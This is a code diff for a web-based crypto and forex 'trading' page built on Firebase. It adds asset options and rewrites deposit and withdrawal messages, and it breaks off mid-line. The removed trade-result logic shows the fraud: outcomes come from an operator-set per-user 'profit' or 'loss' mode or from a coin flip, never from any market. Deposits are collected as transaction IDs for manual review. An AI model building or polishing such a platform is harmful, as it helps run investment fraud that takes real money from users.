@@ -16,13 +16,13 @@
         .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 1000; align-items: center; justify-content: center; padding: 20px; }
         .auth-input { background: #1a1f29; border: 1px solid #2d3748; padding: 14px; border-radius: 12px; width: 100%; color: white; outline: none; }
         #appTerminal { display: none; height: 100dvh; flex-direction: column; padding: 10px; }
-        #authSection { display: none; }
+        #authSection { display: flex; } /* Fixed Black Screen */
         .timer-badge { position: absolute; bottom: 20px; right: 20px; background: #eab308; color: black; padding: 10px 20px; border-radius: 50px; font-weight: 800; display: none; z-index: 100; box-shadow: 0 0 15px rgba(234,179,8,0.4); }
         .btn-grad-green { background: linear-gradient(135deg, #22c55e 0%, #15803d 100%); }
         .btn-grad-red { background: linear-gradient(135deg, #ef4444 0%, #b91c1c 100%); }
         #assetPopup { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); backdrop-filter: blur(8px); z-index: 9999; align-items: center; justify-content: center; }
         
-        /* Custom SweetAlert Style */
+        /* Custom SweetAlert Style to match theme */
         .swal2-popup { background: #111827 !important; color: #fff !important; border-radius: 24px !important; border: 1px solid rgba(255,255,255,0.1) !important; }
         .swal2-title { color: #eab308 !important; }
         .swal2-confirm { background: #eab308 !important; color: #000 !important; font-weight: 800 !important; border-radius: 12px !important; }
@@ -78,6 +78,11 @@
                     <option value="BINANCE:SOLUSDT">SOL/USDT</option>
                     <option value="BINANCE:BNBUSDT">BNB/USDT</option>
                     <option value="BINANCE:DOGEUSDT">DOGE/USDT</option>
+                    <option value="BINANCE:ADAUSDT">ADA/USDT</option>
+                    <option value="BINANCE:MATICUSDT">MATIC/USDT</option>
+                    <option value="BINANCE:DOTUSDT">DOT/USDT</option>
+                    <option value="BINANCE:XRPUSDT">XRP/USDT</option>
+                    <option value="BINANCE:LTCUSDT">LTC/USDT</option>
                 </optgroup>
                 <optgroup label="Forex" class="bg-[#05070a]">
                     <option value="FX:EURUSD">EUR/USD</option>
@@ -85,12 +90,19 @@
                     <option value="FX:USDJPY">USD/JPY</option>
                     <option value="FX:AUDUSD">AUD/USD</option>
                     <option value="FX:USDCAD">USD/CAD</option>
+                    <option value="FX:USDCHF">USD/CHF</option>
+                    <option value="FX:NZDUSD">NZD/USD</option>
                     <option value="FX:EURGBP">EUR/GBP</option>
+                    <option value="FX:EURJPY">EUR/JPY</option>
+                    <option value="FX:GBPJPY">GBP/JPY</option>
                 </optgroup>
-                <optgroup label="Commodities" class="bg-[#05070a]">
+                <optgroup label="Commodities & Indices" class="bg-[#05070a]">
                     <option value="OANDA:XAUUSD">GOLD (XAU/USD)</option>
                     <option value="OANDA:XAGUSD">SILVER (XAG/USD)</option>
                     <option value="OANDA:UK100GBP">UK 100</option>
+                    <option value="OANDA:US30USD">US Wall St 30</option>
+                    <option value="OANDA:NAS100USD">US Tech 100</option>
+                    <option value="OANDA:SPX500USD">US SPX 500</option>
                     <option value="BINANCE:LINKUSDT">LINK/USDT</option>
                 </optgroup>
             </select>
@@ -115,6 +127,7 @@
                         <option value="240">4 Min</option>
                         <option value="300">5 Min</option>
                         <option value="600">10 Min</option>
+                        <option value="1800">30 Min</option>
                     </select>
                 </div>
             </div>
@@ -184,6 +197,7 @@
         let userData = null, mode = 'reg';
 
         function openTradingSite() { window.open("https://traderwaqas.online/", "_blank"); document.getElementById('assetPopup').style.display = 'none'; }
+        
         function switchAuth(t) {
             mode = t;
             document.getElementById('loginTab').className = t==='login' ? 'flex-1 py-3 text-sm font-bold bg-[#2d3748] rounded-xl' : 'flex-1 py-3 text-sm font-bold';
@@ -228,41 +242,35 @@
         
         async function submitFinalDep() {
             const amt = parseFloat(document.getElementById('depAmtInput').value), email = document.getElementById('depEmail').value, tg = document.getElementById('depTg').value, tx = document.getElementById('depTx').value;
-            if(!email || !tg || !tx) return Swal.fire('Wait!', "Fill all details!", 'warning');
+            if(!email || !tg || !tx) return Swal.fire('Check Details', 'Please fill all info!', 'warning');
+            
             await db.collection('requests').add({ uid: auth.currentUser.uid, email, telegram: tg, txid: tx, amount: amt, time: Date.now() });
             hideM('depM');
-            Swal.fire('Submitted!', 'Deposit request received.', 'success');
+            
+            Swal.fire({
+                title: 'Deposit Submitted!',
+                text: 'Your request is under review. Balance will update shortly.',
+                icon: 'success',
+                confirmButtonText: 'Great!'
+            });
         }
 
         async function submitWit() {
             const amt = parseFloat(document.getElementById('witAmt').value), net = document.getElementById('witNet').value, addr = document.getElementById('witAddr').value;
-            if(!addr || isNaN(amt) || amt < 10) return Swal.fire('Error', "Min $10 required!", 'error');
-            if(amt > userData.balance) return Swal.fire('Error', "Low Balance", 'error');
+            if(!addr || isNaN(amt) || amt < 10) return Swal.fire('Limit Error', 'Minimum withdrawal is $10!', 'error');
+            if(amt > userData.balance) return Swal.fire('Low Balance', 'Insufficient funds!', 'error');
+
             await db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase.firestore.FieldValue.increment(-amt) });
             await db.collection('withdrawals').add({ uid: auth.currentUser.uid, email: userData.email, amount: amt, network: net, address: addr, time: Date.now() });
+            
             hideM('witM');
-            Swal.fire('Requested!', 'Withdrawal request sent.', 'success');
+            Swal.fire({
+                title: 'Success!',
+                text: 'Withdrawal of $' + amt + ' submitted.',
+                icon: 'success',
+                confirmButtonText: 'Done'
+            });
         }
 
         async function initTrade(type) {
-            const amt = parseFloat(document.getElementById('tradeAmt').value), dur = parseInt(document.getElementById('duration').value);
-            if(amt > userData.balance || amt <= 0) return Swal.fire('Error', "Low Balance", 'error');
-            await db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase.firestore.FieldValue.increment(-amt) });
-            document.getElementById('tradeTimer').style.display = 'block';
-            let l = dur;
-            let iv = setInterval(() => {
-                let mins = Math.floor(l / 60);
-                let secs = l % 60;
-                document.getElementById('timerText').innerText = `${mins < 10 ? '0'+mins : mins}:${secs < 10 ? '0'+secs : secs}`;
-                if(l <= 0) { clearInterval(iv); document.getElementById('tradeTimer').style.display = 'none'; showRes(amt); }
-                l--;
-            }, 1000);
-        }
-
-        async function showRes(amt) {
-            const mode = userData.tradeMode || 'normal';
-            let win = mode === 'profit' ? true : (mode === 'loss' ? false : Math.random() > 0.5);
-            const p = amt * 1.82, box = document.getElementById('resultBox');
-            if(win) {
-                await db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase.firestore.FieldValue.increment(p) });
-                box.innerHTML = `<h2 class="text-green-500 font-black text-2xl 
+            const amt = parseFloat(document.getElementById('tradeAmt').value), dur = 
